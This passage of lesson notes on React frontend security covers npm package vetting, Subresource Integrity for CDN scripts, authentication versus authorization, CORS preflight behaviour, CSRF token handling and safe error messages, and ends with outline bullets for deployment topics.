  Before adding any package to your project, research its background thoroughly. Use npm commands to gather essential information about package details, maintainers, and source code repository. Look for packages with strong community support, regular maintenance, and transparent development practices.

  ```bash
  # Research packages before adding them:
  npm info package-name  # View package details
  npm info package-name maintainers  # Check who maintains it
  npm view package-name repository  # View source code
  ```

  Watch for warning signs that suggest a package might pose security risks. Packages with very few downloads per week indicate limited community vetting and testing. Packages without recent updates may be abandoned, leaving security vulnerabilities unpatched. Be cautious of packages with suspicious or minimal documentation, as this often indicates poor maintenance practices.

  Packages requesting unnecessary permissions or access beyond their stated functionality should raise immediate concerns. Finally, exercise extra caution when considering packages from unknown or new maintainers for critical functionality, as these haven't yet established trust within the community.

  **Prefer Well-Established Packages:**

  ```jsx
  // BETTER - Well-established, widely-used packages:
  import axios from 'axios';           // 45M+ weekly downloads
  import { format } from 'date-fns';   // 15M+ weekly downloads
  import { v4 as uuidv4 } from 'uuid'; // 25M+ weekly downloads

  // RISKY - New/unknown packages for critical functionality:
  import mysteryAuth from 'new-auth-package';     // 100 weekly downloads
  import cryptoUtils from 'crypto-helper-2023';   // 50 weekly downloads
  import dataProcessor from 'process-my-data';    // No recent commits
  ```

###### Third-Party Script and CDN Security

  While React apps typically bundle dependencies, some integrations require external scripts. These present additional security risks:

  **CDN Script Risks:**

  External scripts loaded from CDNs can be modified or compromised, potentially injecting malicious code into your application. When you must use external scripts, implement Subresource Integrity (SRI) whenever possible to ensure the script content matches what you expect.

  ```jsx
  // RISKY - External scripts can be modified or compromised:
  <script src="https://external-service.com/widget.js"></script>
  <script src="https://analytics.example.com/tracking.js"></script>

  // BETTER - Use Subresource Integrity (SRI) when possible:
  <script 
    src="https://external-service.com/widget.js"
    integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
    crossOrigin="anonymous">
  </script>
  ```

  **Analytics and Tracking Script Considerations:**

  Evaluate third-party analytics services carefully before integration. Consider what data they're collecting, where that data is stored and processed, and whether they comply with privacy regulations like [GDPR](https://gdpr.eu/) and [CCPA](https://oag.ca.gov/privacy/ccpa). Assess whether these services can inject additional scripts or modify your page content.

#### Application Architecture Security

While React developers don't control backend security implementations, understanding how frontend applications interact with security systems is crucial for building secure user experiences. These architectural patterns require frontend developers to handle authentication tokens, manage user sessions, and implement proper error handling that doesn't expose sensitive information.

##### Authentication vs Authorization

Understanding the distinction between authentication and authorization is fundamental to implementing secure React applications. Authentication verifies who a user is, while authorization determines what that authenticated user can access. To illustrate these concepts, consider a banking system where different users have different levels of access and permissions:

- **Basic Membership Permission:** A person must be a member of the bank to hold an account with that bank (authentication establishes identity, authorization confirms membership)
- **Account Ownership Permission:** A person can only request a withdrawal from their own accounts (authorization based on resource ownership)
- **Teller Processing Permission:** A bank teller can process a withdrawal request for any account holder (role-based authorization to perform specific actions)
- **Information Access Permission:** A bank teller can access loan information for account holders but cannot approve loans (authorization grants read access but restricts write access)
- **Loan Officer Permission:** A loan officer can approve member loan requests and view account information but cannot perform withdrawals for members (specialized role with specific permissions that don't overlap with teller capabilities)

These examples demonstrate how authorization creates granular control over who can perform which actions on which resources, while authentication simply establishes who the user is.

In React applications, authentication typically involves managing user credentials, tokens, and login state. Your React app handles the user interface for login forms and manages the authentication tokens received from your backend. This includes implementing login/logout functionality and maintaining user session state throughout the application lifecycle. Session management becomes critical here—React applications must handle token expiration, automatic logout, and session persistence across browser tabs through session validation, automatic token refresh, and periodic session checks.

Authorization controls what authenticated users can see and do within your application through protected routes, conditional rendering, and role-based access control. However, **authorization must be enforced on the backend server, not just in the React frontend.** While React can customize the UI based on user roles for better user experience, malicious users can manipulate client-side code to change local state (such as modifying `role: "user"` to `role: "admin"`). Your backend APIs must validate user permissions for every request—frontend authorization controls are purely for UI enhancement and user experience, while true security enforcement happens on the server.

##### Cross-Origin Resource Sharing (CORS)

CORS is a security mechanism that controls how your React application can make requests to servers on different domains. While CORS policies are configured on the server side, React developers need to understand how these restrictions affect their API integration and how to work within them effectively.

The browser enforces CORS policies whenever your React app attempts cross-origin requests. For example, when your React app runs on `http://localhost:3000` during development and tries to make requests to an API on `https://api.example.com`, the browser checks whether the API server allows such cross-origin communication. Understanding these restrictions helps you structure API calls correctly and troubleshoot connection issues when they arise.

**The CORS Communication Lifecycle:**

The browser handles cross-origin requests differently depending on whether they qualify as "simple" or "complex" requests. Understanding this distinction helps React developers predict when CORS issues might occur and structure their API calls accordingly.

**Simple Requests** bypass the preflight process and proceed directly to the server. These must meet specific criteria: they use only GET, HEAD, or POST methods; they include only simple headers (like `Accept`, `Content-Type` with basic values, and `Authorization`); and for POST requests, the `Content-Type` must be `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`. When your React app makes a simple request, the browser sends it immediately and only checks CORS headers in the server's response. If the response lacks proper CORS headers (like `Access-Control-Allow-Origin`), the browser blocks your React application from accessing the response data, but the request did reach the server.

**Complex Requests** trigger a two-step preflight process for additional security. This includes requests using PUT, DELETE, or PATCH methods; requests with custom headers (common in React apps that send `Authorization: Bearer token` or `Content-Type: application/json`); and POST requests with JSON payloads. First, the browser sends a preflight OPTIONS request to the target server, asking "Is this cross-origin request allowed?" The preflight request includes headers like `Access-Control-Request-Method` (indicating the intended HTTP method) and `Access-Control-Request-Headers` (listing any custom headers the actual request will include).

If the server responds with appropriate CORS headers allowing the request—such as `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, and `Access-Control-Allow-Headers`—the browser proceeds with the actual request. The server's response to the actual request must also include the necessary CORS headers for the browser to allow your React application to access the response data.

However, if the preflight check fails (the server doesn't respond with proper CORS headers or explicitly denies the request), the browser blocks the actual request entirely. Your React application receives a CORS error, and the intended API call never reaches the server. This is why proper error handling in your React components should distinguish between CORS failures and other types of network errors, providing appropriate feedback to users when requests fail due to CORS restrictions.

In development environments, cross-origin requests are common since your React app typically runs on a different port than your API server. These requests require proper CORS headers from the server to succeed. Production deployments may serve both the frontend and API from the same domain (making them same-origin requests), but CORS configuration is still necessary when your React app needs to communicate with external APIs or when using microservices architecture.

When integrating with external APIs or microservices, it's important to understand which request patterns trigger CORS preflight checks. Simple requests (GET, HEAD, POST with basic content types) may proceed directly, while complex requests with custom headers or non-simple methods (PUT, DELETE, PATCH) trigger preflight OPTIONS requests that the server must handle appropriately.

##### CSRF (Cross-Site Request Forgery) Protection

CSRF attacks trick users into performing unintended actions on applications where they're authenticated. React applications must implement proper CSRF protection when making state-changing requests.

###### Frontend Token Handling

Most CSRF protection systems require including a special token with requests that modify data. React applications typically handle these tokens through headers or hidden form fields. The frontend fetches CSRF tokens from the server, stores them temporarily, and includes them with state-changing requests like POST, PUT, and DELETE operations.

###### Request Security Patterns

Implement consistent patterns for including security tokens and handling authentication across all API requests in your React application. A centralized API client can automatically include authentication tokens, CSRF tokens, and handle common security scenarios like expired sessions or permission errors. This approach ensures security patterns are applied consistently throughout your application.

##### Error Handling for Security

Proper error handling in React applications prevents the accidental exposure of sensitive information while providing meaningful feedback to users and developers.

###### Generic Error Messages

Never expose detailed server error messages, stack traces, or system information to end users. Instead, provide generic, user-friendly error messages while logging detailed information for developers. Map HTTP status codes to appropriate user messages, log technical details for debugging purposes, and integrate with error monitoring services in production.

###### Error Boundaries for Security

React Error Boundaries catch JavaScript errors anywhere in the component tree and display fallback UI instead of crashing the entire application. Use them to prevent sensitive information from being exposed through error stack traces. Error boundaries should log detailed error information for developers while showing generic, safe messages to users. They're particularly important around sensitive components like admin panels or user dashboards.

###### Preventing Sensitive Information Exposure

Implement patterns that prevent accidentally exposing user data, API keys, or internal application details through error messages or console logs. Create data sanitization utilities that automatically redact sensitive fields before displaying information to users or logging for debugging. Never display raw user data or error details directly in the UI, and be especially careful with development-only debug information.

#### Deployment Concerns

- Development vs production builds
  - Source map protection
  - Removing dev tools and debugging info
- HTTPS everywhere
  - Secure connections requirement
- CSP (Content Security Policy)
  - Header configuration impact on React apps
  - Script and resource loading restrictions

### Deploying a React App

- choose a service
- upgrading/downgrading package.json deps to meet service's
- connecting service to repo
- using service's environmental key store
- update CORS on backend

### Review and Summary

- Key takeaways from this lesson  
- Connection to next lesson
- Quick preview of this week’s coding assignment
